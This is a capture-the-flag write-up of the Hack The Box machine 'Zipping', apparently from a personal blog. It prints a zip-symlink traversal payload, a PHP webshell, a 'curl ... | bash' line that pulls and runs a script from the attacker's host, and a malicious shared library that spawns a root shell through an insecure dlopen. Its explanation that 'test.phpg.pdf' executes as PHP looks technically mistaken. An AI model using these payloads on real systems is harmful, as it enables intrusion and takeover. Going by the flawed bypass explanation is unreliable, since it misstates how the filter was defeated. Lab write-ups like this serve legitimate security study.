---
layout: post
title: "HTB: Zipping"
subtitle: "A zip symlink read upload.php source, a pathinfo extension bypass dropped a webshell, then a sudo binary that dlopens a home-path .so gave root"
date: 2023-08-29
tags: [htb, linux, file-upload, sudo, privilege-escalation]
category: writeups
tldr: "An upload form 7z-extracted a PDF from a zip. A zip symlink gave arbitrary file read of the upload handler's source, which showed the extension check was just a pathinfo() comparison. A filename like x.phpg.pdf bypassed it and dropped a runnable .php webshell as rektsu. Root came from a NOPASSWD sudo binary that dlopen's a .so from my home config, so a malicious library with a constructor ran as root."
---

## the box

Zipping is a Linux box running OpenSSH 9.0p1 and Apache 2.4.54 on Ubuntu 22.10. The site is a watch store with an `/upload.php` page that accepts a zip and extracts a PDF resume from it. Content discovery also showed `/uploads`, `/shop`, and `/assets`.

## recon

nmap gave me 22 and 80. The upload page said it only accepts zip files containing a single PDF. That kind of "zip in, extract out" handler is a classic spot for zip symlink tricks and extension-check bypasses, so I started there.

## foothold

First I went for source disclosure with a zip symlink. The default traversal payload from the usual blog posts did not work, so I used a doubled-up traversal as the symlink target, then zipped it preserving the link:

```bash
ln -s ....//....//....//....//....//....//....//etc/passwd lol.pdf
zip -r --symlinks lma.zip lol.pdf
```

When the server extracted the archive, it followed the symlink and served the linked file. That confirmed arbitrary read and gave me `/etc/passwd`, which listed `rektsu`. Pointing the same trick at the upload handler returned its source. The extension check was the weak point:

```php
$fileName = $zip->getNameIndex(0);
if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
  mkdir($uploadDir);
  echo exec('7z e '.$zipFile. ' -o' .$uploadDir. '>/dev/null');
```

`pathinfo(..., PATHINFO_EXTENSION)` only looks at the part after the last dot, so a filename with two dots like `test.phpg.pdf` passes the `pdf` check. But Apache's PHP handler matches `.php` anywhere in the dotted name, so the extracted file still runs as PHP. I packed a webshell under that name:

```php
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

Browsing the extracted file gave command execution as `rektsu`. I used it to pull and run a script that dropped my SSH key into `authorized_keys`:

```bash
curl http://10.10.14.4:8000/shell.sh | bash
```

## user

With my key in place I logged in over SSH as `rektsu` and read the user flag.

## root

`sudo -l` showed one NOPASSWD entry:

```
(ALL) NOPASSWD: /usr/bin/stock
```

`stock` is a small ELF that prompts for a password. The decompiled `checkAuth` compared it against a fixed string:

```c
iVar1 = strcmp(param_1,"St0ckM4nager");
```

After the password check, main XORs a string and calls `dlopen` on the result. strace showed exactly what it tries to load:

```
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT
```

The binary loads a shared object from a path inside my own home, and that file did not exist. So I planted my own. A constructor that elevates and spawns a shell runs the moment the library is loaded:

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

```bash
gcc -shared -nostartfiles -o libcounter.so -fPIC exploit.c
sudo /usr/bin/stock
```

After entering `St0ckM4nager`, the dlopen pulled in my library, the constructor fired as root, and I had a root shell to read the root flag.

## takeaway

The zip symlink gave me the handler source for free, which is what made the rest easy. `pathinfo()` checking only the final extension is not a real upload filter, especially when the web server treats `.php` anywhere in the name as executable. The root step was a textbook insecure dlopen: a setuid-via-sudo binary loading a library from a user-writable path, which is just code execution with extra steps.
